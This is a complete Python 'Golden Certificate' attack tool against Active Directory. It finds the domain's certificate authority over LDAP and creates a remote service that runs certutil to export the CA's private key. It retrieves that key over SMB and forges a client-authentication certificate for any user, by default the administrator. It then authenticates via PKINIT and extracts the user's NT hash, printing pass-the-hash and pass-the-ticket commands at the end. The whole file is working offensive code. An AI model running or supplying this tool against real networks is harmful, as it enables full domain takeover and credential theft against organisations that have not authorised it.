#!/usr/bin/env python3


import datetime
import os
import sys
import time
import struct
import signal
import ipaddress
import errno
import re
from getpass import getpass
from random import getrandbits
from typing import Optional, Tuple, Union, List

# ─── Signal handler for SIGTERM only (kill signals, not Ctrl+C) ───────────────
def _signal_handler(signum, frame):
    print("\n[!] Terminated by signal %d. Shutting down..." % signum)
    sys.exit(143 if signum == signal.SIGTERM else 128 + signum)

signal.signal(signal.SIGTERM, _signal_handler)
if hasattr(signal, "SIGBREAK"):
    signal.signal(signal.SIGBREAK, _signal_handler)
# NOTE: We do NOT trap SIGINT here. Ctrl+C raises KeyboardInterrupt naturally,
# which is caught cleanly by the try/except blocks in prompt() and __main__.

# ─── Dependency Check ─────────────────────────────────────────────────────────
MISSING = []

try:
    from impacket.dcerpc.v5 import rpcrt, rrp, scmr, transport
    from impacket.dcerpc.v5.dtypes import DWORD, LONG, LPWSTR, PBYTE, ULONG, WSTR
    from impacket.dcerpc.v5.ndr import NDRSTRUCT
    from impacket.dcerpc.v5.nrpc import checkNullString
    from impacket.dcerpc.v5.rpcrt import (
        RPC_C_AUTHN_LEVEL_PKT_PRIVACY, DCERPCException, TypeSerialization1
    )
    from impacket.krb5 import constants
    from impacket.krb5.asn1 import (
        AD_IF_RELEVANT, AP_REQ, AS_REP, TGS_REP, TGS_REQ,
        Authenticator, EncASRepPart, EncTicketPart,
        seq_set, seq_set_iter,
    )
    from impacket.krb5.asn1 import Ticket as TicketAsn1
    from impacket.krb5.ccache import CCache
    from impacket.krb5.crypto import Key, _enctype_table
    from impacket.krb5.kerberosv5 import KerberosError, sendReceive
    from impacket.krb5.pac import (
        NTLM_SUPPLEMENTAL_CREDENTIAL, PAC_CREDENTIAL_DATA,
        PAC_CREDENTIAL_INFO, PAC_INFO_BUFFER, PACTYPE,
    )
    from impacket.krb5.types import KerberosTime, Principal, Ticket
    from impacket.smbconnection import SMBConnection
    from impacket.uuid import string_to_bin, uuidtup_to_bin
    from impacket.ldap import ldap as impacket_ldap
    from impacket.ldap import ldaptypes
except ImportError as e:
    MISSING.append(f"impacket: {e}")

try:
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import rsa
    from cryptography.hazmat.backends import default_backend
    from cryptography.hazmat.primitives.serialization import pkcs12
    from cryptography import x509 as cx509
    from cryptography.x509.oid import NameOID, ExtendedKeyUsageOID
except ImportError as e:
    MISSING.append(f"cryptography: {e}")

try:
    from pyasn1.codec.der import decoder, encoder
    from pyasn1.type.univ import noValue
    import pyasn1.type.univ as pyasn1_univ
    import pyasn1.type.char as pyasn1_char
except ImportError as e:
    MISSING.append(f"pyasn1: {e}")

try:
    from asn1crypto import cms, core as asn1_core
except ImportError as e:
    MISSING.append(f"asn1crypto: {e}")

if MISSING:
    print("[!] Missing dependencies:")
    for m in MISSING:
        print(f"    - {m}")
    print("\n[*] Install: pip install impacket cryptography pyasn1 asn1crypto")
    sys.exit(1)

# ─── OIDs ─────────────────────────────────────────────────────────────────────
PRINCIPAL_NAME = cx509.ObjectIdentifier("1.3.6.1.4.1.311.20.2.3")
OID_NTDS_SID   = cx509.ObjectIdentifier("1.3.6.1.4.1.311.25.2.1")

# ─── Logging helpers ──────────────────────────────────────────────────────────
def info(msg):    print(f"[*] {msg}")
def ok(msg):      print(f"[+] {msg}")
def warn(msg):    print(f"[!] {msg}")
def err(msg):     print(f"[-] {msg}")
def step(n, msg): print(f"\n{'─'*55}\n[STEP {n}] {msg}\n{'─'*55}")

# ─── Input validation helpers ──────────────────────────────────────────────────
def _validate_ip(val: str) -> bool:
    try:
        ipaddress.ip_address(val)
        return True
    except ValueError:
        return False

def _validate_domain(val: str) -> bool:
    if not val or "." not in val:
        return False
    if re.search(r"[^a-zA-Z0-9.\-]", val):
        return False
    return True

def _validate_nt_hash(val: str) -> bool:
    return bool(re.fullmatch(r"[a-fA-F0-9]{32}", val))

def _validate_upn(val: str, domain: str) -> bool:
    if "@" not in val:
        return False
    user_part, dom_part = val.rsplit("@", 1)
    if not user_part:
        return False
    if dom_part.lower() != domain.lower():
        warn(f"UPN domain '{dom_part}' does not match target domain '{domain}'")
    return True

def _safe_int(val: str, default: int, min_val: int = 1, max_val: int = 9999) -> int:
    try:
        v = int(val.strip())
        if v < min_val or v > max_val:
            warn(f"Value {v} out of range ({min_val}-{max_val}); using default {default}")
            return default
        return v
    except (ValueError, TypeError, AttributeError):
        return default

# ─── Key derivation ───────────────────────────────────────────────────────────
def truncate_key(value: bytes, keysize: int) -> bytes:
    import hashlib
    output, i = b"", 0
    while len(output) < keysize:
        h = hashlib.sha1(bytes([i]) + value).digest()
        if len(output) + len(h) > keysize:
            output += h[:keysize - len(output)]
            break
        output += h
        i += 1
    return output

# ─── FIX: robust integer conversion for impacket enum constants ──────────────
def _e(val) -> int:
    if isinstance(val, int):
        return val
    if hasattr(val, "value"):
        return int(val.value)
    if hasattr(val, "_value_"):
        return int(val._value_)
    return int(val)

# ─── STEP 0: Discover CA via LDAP ─────────────────────────────────────────────
def find_ca_name(dc_ip, domain, username, password, lmhash="", nthash=""):
    info("Querying LDAP for Certificate Authority...")
    base_dn     = ",".join([f"DC={p}" for p in domain.split(".")])
    search_base = (
        f"CN=Enrollment Services,CN=Public Key Services,"
        f"CN=Services,CN=Configuration,{base_dn}"
    )
    try:
        ldap_conn = impacket_ldap.LDAPConnection(f"ldap://{dc_ip}", base_dn, dc_ip)
        if nthash:
            lm = lmhash or "aad3b435b51404eeaad3b435b51404ee"
            ldap_conn.login(username, password, domain, lm, nthash)
        else:
            ldap_conn.login(username, password, domain)

        resp = ldap_conn.search(
            searchBase=search_base,
            searchFilter="(objectClass=pKIEnrollmentService)",
            attributes=["cn", "dNSHostName"],
        )

        cas_found = []
        for item in resp:
            entry = {}
            if hasattr(item, "entry_to_dict"):
                entry = item.entry_to_dict()
                ca_name = (entry.get("cn") or [""])[0]
                dns     = (entry.get("dNSHostName") or [""])[0]
            else:
                try:
                    for attr in item["attributes"]:
                        name = str(attr["type"])
                        vals = [str(v) for v in attr["vals"]]
                        entry[name] = vals[0] if vals else ""
                    ca_name = entry.get("cn", "")
                    dns     = entry.get("dNSHostName", "")
                except Exception:
                    continue

            if ca_name:
                cas_found.append((ca_name, dns))
                ok(f"Found CA: {ca_name} (host: {dns})")

        if cas_found:
            chosen = cas_found[0][0]
            ok(f"Using CA: {chosen}")
            return chosen

        warn("No CA found via LDAP.")
        return None

    except Exception as e:
        warn(f"LDAP CA discovery failed: {e}")
        return None

# ─── STEP 1: CA Backup ────────────────────────────────────────────────────────
def _get_smb_connection(target_ip, username, password, domain, lmhash, nthash, timeout):
    smb = SMBConnection(target_ip, target_ip, timeout=timeout)
    smb.login(username, password, domain, lmhash, nthash)
    return smb

def _get_dce_scmr(target_ip, username, password, domain, lmhash, nthash, timeout):
    rpctransport = transport.SMBTransport(
        target_ip, 445, r'\svcctl',
        username=username, password=password,
        domain=domain, lmhash=lmhash, nthash=nthash,
    )
    rpctransport.set_connect_timeout(timeout)
    dce = rpctransport.get_dce_rpc()
    dce.set_auth_level(rpcrt.RPC_C_AUTHN_LEVEL_NONE)
    dce.connect()
    dce.bind(scmr.MSRPC_UUID_SCMR)
    return dce

def _smb_file_exists(smb, share, path):
    try:
        smb.listPath(share, path)
        return True
    except Exception:
        return False

def backup_ca(target_ip, username, password, domain, ca_name,
              lmhash="", nthash="", timeout=10):
    info(f"Connecting to Service Control Manager on {target_ip}...")
    try:
        dce = _get_dce_scmr(target_ip, username, password, domain,
                             lmhash, nthash, timeout)
    except Exception as e:
        err(f"Failed to connect to SCM: {e}")
        return None

    try:
        res    = scmr.hROpenSCManagerW(dce)
        handle = res["lpScHandle"]
    except Exception as e:
        err(f"Failed to open SCM handle: {e}")
        return None

    backup_cmd = (
        "cmd.exe /c certutil -backupkey -f -p certipy "
        "C:\\Windows\\Tasks\\Certipy && "
        "move /y C:\\Windows\\Tasks\\Certipy\\* C:\\Windows\\Tasks\\certipy.pfx"
    )

    info("Creating backup service on target...")
    svc_handle = None
    try:
        resp       = scmr.hRCreateServiceW(
            dce, handle, "Certipy", "Certipy",
            lpBinaryPathName=backup_cmd,
            dwStartType=scmr.SERVICE_DEMAND_START,
        )
        svc_handle = resp["lpServiceHandle"]
    except Exception as e:
        if "ERROR_SERVICE_EXISTS" in str(e):
            info("Service already exists, reusing...")
            try:
                resp       = scmr.hROpenServiceW(dce, handle, "Certipy")
                svc_handle = resp["lpServiceHandle"]
                scmr.hRChangeServiceConfigW(dce, svc_handle, lpBinaryPathName=backup_cmd)
            except Exception as e2:
                err(f"Failed to reuse existing service: {e2}")
                return None
        else:
            err(f"Failed to create service: {e}")
            return None

    info("Starting backup service (running certutil on target)...")
    try:
        scmr.hRStartServiceW(dce, svc_handle)
    except Exception:
        pass

    info("Waiting for certutil to finish (polling SMB)...")
    pfx_data   = None
    found_share = None
    found_path  = None

    try:
        smb = _get_smb_connection(target_ip, username, password, domain,
                                  lmhash, nthash, timeout)
        candidates = [
            ("C$",     "\\Windows\\Tasks\\certipy.pfx"),
            ("ADMIN$", "\\Tasks\\certipy.pfx"),
        ]

        for attempt in range(15):
            for share, path in candidates:
                try:
                    smb.connectTree(share)
                    if _smb_file_exists(smb, share, path):
                        found_share = share
                        found_path  = path
                        break
                except Exception:
                    continue
            if found_share:
                break
            time.sleep(2)

    except Exception as e:
        err(f"SMB polling failed: {e}")

    if found_share:
        info("Retrieving PFX via SMB...")
        try:
            def store_pfx(data: bytes):
                nonlocal pfx_data
                pfx_data = data

            smb.getFile(found_share, found_path, store_pfx)
            try:
                smb.deleteFile(found_share, found_path)
            except Exception:
                pass
        except Exception as e:
            err(f"SMB file retrieval failed: {e}")
    else:
        err("PFX file never appeared on target after 30 s.")

    cleanup_cmd = (
        "cmd.exe /c del /f /q C:\\Windows\\Tasks\\Certipy\\* "
        "& rmdir /q C:\\Windows\\Tasks\\Certipy"
    )
    try:
        scmr.hRChangeServiceConfigW(dce, svc_handle, lpBinaryPathName=cleanup_cmd)
        scmr.hRStartServiceW(dce, svc_handle)
    except Exception:
        pass
    try:
        scmr.hRDeleteService(dce, svc_handle)
        scmr.hRCloseServiceHandle(dce, svc_handle)
    except Exception:
        pass

    if not pfx_data:
        err("Could not retrieve CA PFX from target.")
        err("  - Confirm ADCS is installed on the DC")
        err("  - Confirm account has ManageCA / local admin rights")
        err("  - Check C:\\Windows\\Tasks\\ on the DC manually")
        return None

    ok(f"Retrieved CA PFX ({len(pfx_data)} bytes)")

    ca_key = ca_cert = None
    for pwd in [b"certipy", b""]:
        try:
            ca_key, ca_cert, _ = pkcs12.load_key_and_certificates(
                pfx_data, pwd, default_backend()
            )
            if ca_key and ca_cert:
                break
        except Exception:
            continue

    if not ca_key or not ca_cert:
        err("Failed to parse CA PFX (tried passwords 'certipy' and blank)")
        raw_path = f"{ca_name}_raw.pfx"
        try:
            with open(raw_path, "wb") as f:
                f.write(pfx_data)
            warn(f"Saved raw PFX to {raw_path} — try manually: "
                 f"openssl pkcs12 -in {raw_path} -passin pass:certipy")
        except OSError as oe:
            err(f"Could not save raw PFX to disk: {oe}")
        return None

    clean_pfx = pkcs12.serialize_key_and_certificates(
        name=None, key=ca_key, cert=ca_cert, cas=None,
        encryption_algorithm=serialization.NoEncryption()
    )
    ca_pfx_path = f"{ca_name}.pfx"
    try:
        with open(ca_pfx_path, "wb") as f:
            f.write(clean_pfx)
    except OSError as oe:
        err(f"Failed to write CA PFX to disk: {oe}")
        return None

    ok(f"Saved CA certificate + private key to: {ca_pfx_path}")
    return ca_pfx_path, ca_key, ca_cert

# ─── STEP 2: Forge Certificate ────────────────────────────────────────────────
def forge_certificate(ca_key, ca_cert, target_upn: str,
                      subject_str: Optional[str] = None,
                      validity_days: int = 365):
    info(f"Forging certificate for UPN: {target_upn}")

    try:
        new_key = rsa.generate_private_key(
            public_exponent=65537, key_size=2048, backend=default_backend()
        )
    except Exception as e:
        err(f"RSA key generation failed: {e}")
        raise

    cn = target_upn.split("@")[0]

    if subject_str:
        oid_map = {
            "CN": NameOID.COMMON_NAME,
            "DC": NameOID.DOMAIN_COMPONENT,
            "OU": NameOID.ORGANIZATIONAL_UNIT_NAME,
            "O":  NameOID.ORGANIZATION_NAME,
            "L":  NameOID.LOCALITY_NAME,
            "ST": NameOID.STATE_OR_PROVINCE_NAME,
            "C":  NameOID.COUNTRY_NAME,
        }
        attrs = []
        for part in subject_str.split(","):
            part = part.strip()
            if "=" not in part:
                continue
            k, v = part.split("=", 1)
            oid  = oid_map.get(k.strip().upper())
            if oid:
                attrs.append(cx509.NameAttribute(oid, v.strip()))
        subject = cx509.Name(attrs)
    else:
        subject = cx509.Name([cx509.NameAttribute(NameOID.COMMON_NAME, cn)])

    now = datetime.datetime.now(datetime.timezone.utc)

    try:
        upn_der = encoder.encode(pyasn1_char.UTF8String(target_upn))
    except Exception as e:
        err(f"Failed to encode UPN into DER: {e}")
        raise

    san_ext = cx509.SubjectAlternativeName([
        cx509.OtherName(PRINCIPAL_NAME, upn_der)
    ])

    try:
        cert = (
            cx509.CertificateBuilder()
            .subject_name(subject)
            .issuer_name(ca_cert.subject)
            .public_key(new_key.public_key())
            .serial_number(cx509.random_serial_number())
            .not_valid_before(now - datetime.timedelta(days=1))
            .not_valid_after(now + datetime.timedelta(days=validity_days))
            .add_extension(
                cx509.AuthorityKeyIdentifier.from_issuer_public_key(ca_key.public_key()),
                critical=False
            )
            .add_extension(
                cx509.SubjectKeyIdentifier.from_public_key(new_key.public_key()),
                critical=False
            )
            .add_extension(
                cx509.ExtendedKeyUsage([
                    ExtendedKeyUsageOID.CLIENT_AUTH,
                    cx509.ObjectIdentifier("1.3.6.1.5.2.3.4"),
                ]),
                critical=False
            )
            .add_extension(san_ext, critical=False)
            .sign(ca_key, hashes.SHA256(), default_backend())
        )
    except Exception as e:
        err(f"Certificate signing failed: {e}")
        raise

    try:
        pfx_data = pkcs12.serialize_key_and_certificates(
            name=cn.encode(), key=new_key, cert=cert, cas=None,
            encryption_algorithm=serialization.NoEncryption()
        )
    except Exception as e:
        err(f"PFX serialization failed: {e}")
        raise

    out_path = f"{cn.lower()}_forged.pfx"
    try:
        with open(out_path, "wb") as f:
            f.write(pfx_data)
    except OSError as oe:
        err(f"Failed to write forged PFX to disk: {oe}")
        raise

    ok(f"Saved forged certificate to: {out_path}")
    return out_path, new_key, cert

# ─── STEP 3: PKINIT Auth + NT Hash via U2U ────────────────────────────────────

def _build_pkinit_as_req(username, domain, private_key, cert):
    try:
        from certipy.lib.pkinit import build_pkinit_as_req
        return build_pkinit_as_req(username, domain, private_key, cert)
    except ImportError:
        err("certipy-ad is required for PKINIT. Install: pip install certipy-ad")
        return None, None
    except Exception as e:
        err(f"PKINIT builder failed: {e}")
        return None, None

def _parse_pk_as_rep(as_rep_decoded):
    try:
        from certipy.lib.structs import PaPkAsRep
        for pa in as_rep_decoded["padata"]:
            if int(pa["padata-type"]) == 17:
                return PaPkAsRep.load(bytes(pa["padata-value"])).native
    except ImportError:
        pass
    for pa in as_rep_decoded["padata"]:
        if int(pa["padata-type"]) == 17:
            return {"dhSignedData": bytes(pa["padata-value"]), "_raw": True}
    return None

def _extract_dh_key(pk_as_rep, diffie):
    try:
        from certipy.lib.structs import KDCDHKeyInfo
        ci        = cms.ContentInfo.load(pk_as_rep["dhSignedData"]).native
        key_info  = ci["content"]["encap_content_info"]["content"]
        auth_data = KDCDHKeyInfo.load(key_info).native
        pub_key   = int.from_bytes(
            asn1_core.BitString(auth_data["subjectPublicKey"]).dump()[7:],
            "big", signed=False,
        )
        shared_key   = diffie.exchange(pub_key)
        server_nonce = pk_as_rep.get("serverDHNonce", b"")
        return shared_key + diffie.dh_nonce + server_nonce
    except Exception as e:
        err(f"DH key extraction failed: {e}")
        return None

def _parse_pac_for_nt_hash(pac_data: bytes, special_key: Key):
    try:
        if len(pac_data) < 8:
            return None, None

        c_buffers = struct.unpack_from("<I", pac_data, 0)[0]
        buf_array_offset = 8
        for i in range(c_buffers):
            entry_offset = buf_array_offset + i * 16
            if entry_offset + 16 > len(pac_data):
                break

            ul_type     = struct.unpack_from("<I", pac_data, entry_offset)[0]
            cb_buf_size = struct.unpack_from("<I", pac_data, entry_offset + 4)[0]
            buf_offset  = struct.unpack_from("<Q", pac_data, entry_offset + 8)[0]

            if ul_type != 2:
                continue

            if buf_offset + cb_buf_size > len(pac_data):
                warn(f"PAC buffer offset out of range: offset={buf_offset} "
                     f"size={cb_buf_size} total={len(pac_data)}")
                return None, None

            raw_cred  = pac_data[buf_offset: buf_offset + cb_buf_size]
            cred_info = PAC_CREDENTIAL_INFO(raw_cred)
            enc_type  = int(cred_info["EncryptionType"])
            cipher    = _enctype_table[enc_type]
            decrypted = cipher.decrypt(special_key, 16, cred_info["SerializedData"])

            ts      = TypeSerialization1(decrypted)
            ts_len  = len(ts)
            pcc     = PAC_CREDENTIAL_DATA(decrypted[ts_len + 4:])

            lm_hash = "aad3b435b51404eeaad3b435b51404ee"
            nt_hash = None

            for cred in pcc["Credentials"]:
                cs = NTLM_SUPPLEMENTAL_CREDENTIAL(b"".join(cred["Credentials"]))
                if any(cs["LmPassword"]):
                    lm_hash = cs["LmPassword"].hex()
                nt_hash = cs["NtPassword"].hex()
                break

            return lm_hash, nt_hash

    except Exception as e:
        warn(f"PAC parsing error: {e}")

    return None, None


def pkinit_authenticate(pfx_path: str, username: str, domain: str, dc_ip: str):
    info(f"Loading forged certificate: {pfx_path}")

    if not os.path.isfile(pfx_path):
        err(f"PFX file not found: {pfx_path}")
        return False

    try:
        with open(pfx_path, "rb") as f:
            pfx_data = f.read()
    except OSError as oe:
        err(f"Failed to read PFX file: {oe}")
        return False

    try:
        priv_key, cert, _ = pkcs12.load_key_and_certificates(
            pfx_data, None, default_backend()
        )
    except Exception as e:
        err(f"Failed to load PFX: {e}")
        return False

    if not isinstance(priv_key, rsa.RSAPrivateKey):
        err("Only RSA private keys are supported for PKINIT")
        return False

    result = _build_pkinit_as_req(username, domain, priv_key, cert)
    if result is None or result[0] is None:
        return False
    as_req, diffie = result

    info(f"Sending PKINIT AS-REQ to {dc_ip}...")
    try:
        tgt_bytes = sendReceive(as_req, domain, dc_ip)
    except KerberosError as e:
        err(f"Kerberos AS-REQ failed: {e}")
        _print_kerberos_hint(str(e), username, domain)
        return False
    except Exception as e:
        err(f"AS-REQ send failed: {e}")
        return False

    ok("Got TGT!")
    try:
        as_rep = decoder.decode(tgt_bytes, asn1Spec=AS_REP())[0]
    except Exception as e:
        err(f"Failed to decode AS-REP: {e}")
        return False

    pk_as_rep = _parse_pk_as_rep(as_rep)
    if pk_as_rep is None:
        err("PA_PK_AS_REP not found in AS-REP")
        return False

    full_key = _extract_dh_key(pk_as_rep, diffie)
    if full_key is None:
        return False

    etype  = int(as_rep["enc-part"]["etype"])
    cipher = _enctype_table[etype]

    if etype == 18:
        t_key = truncate_key(full_key, 32)
    elif etype == 17:
        t_key = truncate_key(full_key, 16)
    else:
        err(f"Unsupported encryption type: {etype}")
        return False

    sym_key = Key(cipher.enctype, t_key)

    try:
        dec_data = cipher.decrypt(sym_key, 3, bytes(as_rep["enc-part"]["cipher"]))
    except Exception as e:
        err(f"Failed to decrypt AS-REP enc-part: {e}")
        return False

    try:
        enc_as_rep_part = decoder.decode(dec_data, asn1Spec=EncASRepPart())[0]
    except Exception as e:
        err(f"Failed to decode EncASRepPart: {e}")
        return False

    session_etype  = int(enc_as_rep_part["key"]["keytype"])
    session_cipher = _enctype_table[session_etype]
    session_key    = Key(session_cipher.enctype,
                         bytes(enc_as_rep_part["key"]["keyvalue"]))

    ccache      = CCache()
    ccache.fromTGT(tgt_bytes, sym_key, None)
    ccache_name = f"{username.rstrip('$').lower()}.ccache"
    try:
        ccache.saveFile(ccache_name)
    except OSError as oe:
        err(f"Failed to save credential cache: {oe}")
        return False
    ok(f"Saved credential cache: {ccache_name}")

    info("Sending U2U TGS-REQ to extract NT hash...")
    try:
        ap_req             = AP_REQ()
        ap_req["pvno"]     = 5
        ap_req["msg-type"] = _e(constants.ApplicationTagNumbers.AP_REQ)
        ap_req["ap-options"] = constants.encodeFlags([])

        ticket = Ticket()
        ticket = ticket.from_asn1(as_rep["ticket"])
        seq_set(ap_req, "ticket", ticket.to_asn1)

        now_dt        = datetime.datetime.now(datetime.timezone.utc)
        authenticator = Authenticator()
        authenticator["authenticator-vno"] = 5
        authenticator["crealm"]            = bytes(as_rep["crealm"])
        cname = Principal()
        cname = cname.from_asn1(as_rep, "crealm", "cname")
        seq_set(authenticator, "cname", cname.components_to_asn1)
        authenticator["cusec"] = now_dt.microsecond
        authenticator["ctime"] = KerberosTime.to_asn1(now_dt)

        enc_auth = session_cipher.encrypt(
            session_key, 7, encoder.encode(authenticator), None
        )
        ap_req["authenticator"]           = noValue
        ap_req["authenticator"]["etype"]  = session_cipher.enctype
        ap_req["authenticator"]["cipher"] = enc_auth

        tgs_req             = TGS_REQ()
        tgs_req["pvno"]     = 5
        tgs_req["msg-type"] = _e(constants.ApplicationTagNumbers.TGS_REQ)

        tgs_req["padata"]                    = noValue
        tgs_req["padata"][0]                 = noValue
        tgs_req["padata"][0]["padata-type"]  = _e(
            constants.PreAuthenticationDataTypes.PA_TGS_REQ
        )
        tgs_req["padata"][0]["padata-value"] = encoder.encode(ap_req)

        req_body = seq_set(tgs_req, "req-body")

        kdc_flag_names = [
            "forwardable", "renewable", "canonicalize",
            "enc_tkt_in_skey", "renewable_ok",
        ]
        opts = []
        for flag_name in kdc_flag_names:
            attr = getattr(constants.KDCOptions, flag_name, None)
            if attr is not None:
                opts.append(_e(attr))
        req_body["kdc-options"] = constants.encodeFlags(opts)

        server_name = Principal(
            username,
            type=_e(constants.PrincipalNameType.NT_UNKNOWN)
        )
        seq_set(req_body, "sname", server_name.components_to_asn1)
        req_body["realm"] = str(as_rep["crealm"])
        req_body["till"]  = KerberosTime.to_asn1(
            now_dt + datetime.timedelta(days=1)
        )
        req_body["nonce"] = getrandbits(31)

        seq_set_iter(req_body, "etype", (
            int(session_cipher.enctype),
            _e(constants.EncryptionTypes.rc4_hmac),
        ))

        ticket_asn1 = ticket.to_asn1(TicketAsn1())
        seq_set_iter(req_body, "additional-tickets", (ticket_asn1,))

        tgs_resp_bytes = sendReceive(encoder.encode(tgs_req), domain, dc_ip)
        tgs = decoder.decode(tgs_resp_bytes, asn1Spec=TGS_REP())[0]

        tgs_etype  = int(tgs["ticket"]["enc-part"]["etype"])
        tgs_cipher = _enctype_table[tgs_etype]
        plaintext  = tgs_cipher.decrypt(
            session_key, 2, bytes(tgs["ticket"]["enc-part"]["cipher"])
        )

        special_key = Key(18, t_key)

        enc_ticket_part = decoder.decode(plaintext, asn1Spec=EncTicketPart())[0]

        try:
            ad_data        = enc_ticket_part["authorization-data"][0]["ad-data"]
            ad_if_relevant = decoder.decode(ad_data, asn1Spec=AD_IF_RELEVANT())[0]
            pac_raw        = ad_if_relevant[0]["ad-data"].asOctets()
        except Exception as e:
            err(f"Failed to extract PAC: {e}")
            warn("TGT was saved — use the ccache for authentication")
            return True

        lm_hash, nt_hash = _parse_pac_for_nt_hash(pac_raw, special_key)

        if nt_hash:
            print()
            ok("=" * 60)
            ok(f"  Target : {username}@{domain}")
            ok(f"  Hash   : {lm_hash}:{nt_hash}")
            ok("=" * 60)
            print()
            ok("Pass-the-Hash:")
            ok(f"  evil-winrm -i {dc_ip} -u {username} -H {nt_hash}")
            ok(f"  impacket-psexec {domain}/{username}@{dc_ip} "
               f"-hashes {lm_hash}:{nt_hash}")
            ok("Pass-the-Ticket:")
            ok(f"  export KRB5CCNAME={ccache_name}")
            ok(f"  impacket-psexec {domain}/{username}@{dc_ip} -k -no-pass")
        else:
            warn("Could not extract NT hash from PAC")
            warn("TGT is valid — use the ccache for authentication")

        return nt_hash or True

    except KerberosError as e:
        err(f"U2U TGS-REQ failed: {e}")
        warn("TGT was saved — hash extraction failed but you have a valid ticket")
        return True
    except Exception as e:
        err(f"NT hash extraction error: {e}")
        import traceback; traceback.print_exc()
        warn("TGT was saved — use the ccache")
        return True


def _print_kerberos_hint(error_str, username, domain):
    if "KDC_ERR_CLIENT_NAME_MISMATCH" in error_str:
        err(f"Username '{username}' doesn't match the UPN in the forged cert")
    elif "KDC_ERR_WRONG_REALM" in error_str:
        err(f"Domain '{domain}' doesn't match the certificate")
    elif "KDC_ERR_CERTIFICATE_MISMATCH" in error_str:
        err("SID mismatch — forged cert SID doesn't match AD object")
    elif "KDC_ERR_INCONSISTENT_KEY_PURPOSE" in error_str:
        err("Certificate lacks Client Authentication EKU")
    elif "connect" in error_str.lower() or "Cannot contact" in error_str:
        err(f"Cannot reach KDC — check that {domain} resolves to {dc_ip}")

# ─── Input helpers ────────────────────────────────────────────────────────────
def prompt(label: str, default: Optional[str] = None, secret: bool = False) -> str:
    suffix = f" [{default}]" if default else ""
    msg    = f"  {label}{suffix}: "
    try:
        val = getpass(msg) if secret else input(msg)
    except (EOFError, KeyboardInterrupt):
        print("\n[!] Input cancelled by user.")
        sys.exit(130)
    except SystemExit:
        raise
    except Exception as e:
        err(f"Input failed: {e}")
        sys.exit(1)
    val = val.strip()
    return val if val else (default or "")

# ─── Main ─────────────────────────────────────────────────────────────────────
def main():
    print("""
╔══════════════════════════════════════════════════╗
║         Golden Certificate Attack Tool          ║
║                                                  ║
║  Step 0: Discover CA via LDAP                   ║
║  Step 1: Backup CA Private Key (SCM + SMB)      ║
║  Step 2: Forge Certificate (offline)            ║
║  Step 3: PKINIT Auth + NT Hash Extraction       ║
╚══════════════════════════════════════════════════╝
""")

    print("[*] Enter target details:\n")

    # ── DC IP with validation ──
    while True:
        dc_ip = prompt("DC IP", "192.168.x.x")
        if not dc_ip:
            dc_ip = "192.168.x.x"
        if _validate_ip(dc_ip):
            break
        warn(f"'{dc_ip}' does not look like a valid IPv4/IPv6 address. Please retry.")

    # ── Domain with validation ──
    while True:
        domain = prompt("Domain", "domain.com")
        if not domain:
            domain = "domain.com"
        if _validate_domain(domain):
            break
        warn(f"'{domain}' does not look like a valid domain. Please retry.")

    # ── Username ──
    username = prompt("Username (needs ManageCA or Admin)", "administrator")
    if not username:
        err("Username is required.")
        sys.exit(1)

    # ── Password / Hash ──
    password = ""
    try:
        password = prompt("Password", secret=True)
    except SystemExit:
        raise
    except Exception as e:
        err(f"Password input failed: {e}")
        sys.exit(1)

    lmhash = nthash = ""
    if not password:
        nt = prompt("NT Hash (leave blank if using password)")
        if nt:
            if not _validate_nt_hash(nt):
                warn(f"NT hash '{nt}' is not 32 hex chars; proceeding anyway.")
            nthash = nt.strip()
            lmhash = "aad3b435b51404eeaad3b435b51404ee"

    # ── Target UPN ──
    while True:
        target_upn = prompt("Target UPN to forge cert for", f"administrator@{domain}")
        if not target_upn:
            target_upn = f"administrator@{domain}"
        if _validate_upn(target_upn, domain):
            break
        warn(f"'{target_upn}' is not a valid UPN (expected user@domain). Please retry.")

    forged_username = target_upn.split("@")[0]

    # ── Step 0 ──
    step(0, "Discovering CA Name via LDAP")
    try:
        ca_name = find_ca_name(dc_ip, domain, username, password, lmhash, nthash)
    except Exception as e:
        err(f"Unexpected error during CA discovery: {e}")
        ca_name = None

    if not ca_name:
        ca_name = prompt("CA Name not found automatically. Enter manually")
        if not ca_name:
            err("CA name is required. Aborting.")
            sys.exit(1)

    # ── Step 1 ──
    step(1, "Backing up CA Private Key")
    try:
        result = backup_ca(dc_ip, username, password, domain, ca_name, lmhash, nthash)
    except Exception as e:
        err(f"Unexpected error during CA backup: {e}")
        result = None

    if result is None:
        err("CA backup failed. Aborting.")
        sys.exit(1)
    ca_pfx_path, ca_key, ca_cert = result

    # ── Step 2 ──
    step(2, "Forging Certificate")
    subject = prompt(
        "Custom subject DN (blank = auto from UPN)",
        f"CN={forged_username},CN=Users,"
        f"DC={',DC='.join(domain.split('.'))}",
    )
    validity_str = prompt("Validity days", "365")
    validity_days = _safe_int(validity_str, 365, 1, 9999)

    try:
        pfx_path, _, _ = forge_certificate(
            ca_key, ca_cert, target_upn,
            subject_str=subject if subject else None,
            validity_days=validity_days,
        )
    except Exception as e:
        err(f"Certificate forgery failed: {e}")
        sys.exit(1)

    # ── Step 3 ──
    step(3, "PKINIT Authentication + NT Hash Extraction")
    try:
        result = pkinit_authenticate(pfx_path, forged_username, domain, dc_ip)
    except Exception as e:
        err(f"Unexpected error during PKINIT authentication: {e}")
        import traceback; traceback.print_exc()
        result = False

    if result is False:
        err("Authentication failed.")
        sys.exit(1)

    print()
    ok("Attack complete!")
    ok(f"Forged cert : {pfx_path}")
    ok(f"Ccache      : {forged_username.lower()}.ccache")
    ok(f"To use ccache: export KRB5CCNAME={forged_username.lower()}.ccache")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user. Exiting.")
        sys.exit(130)
    except SystemExit:
        raise
    except Exception as e:
        err(f"Unhandled exception in main: {e}")
        import traceback; traceback.print_exc()
        sys.exit(1)
